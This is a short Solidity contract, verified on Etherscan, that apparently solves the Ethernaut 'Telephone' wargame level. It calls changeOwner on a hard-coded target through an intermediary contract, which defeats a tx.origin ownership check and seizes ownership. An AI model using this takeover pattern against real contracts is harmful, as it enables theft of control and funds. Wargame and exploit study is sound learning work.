/**
 *Submitted for verification at Etherscan.io on 2021-08-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TelephoneInterface {

  function changeOwner(address _owner) external;

}


contract Telephone {

  address private telephone = 0x2A628AcC80ce2eefF1Dab005b9756d2E9aBf4B5B;
  address private owner = 0xE6fFB0d3237F66A74f5b8cdF93eA2508801e52B9;

  function changeOwner() public {
    TelephoneInterface(telephone).changeOwner(owner);
  }
}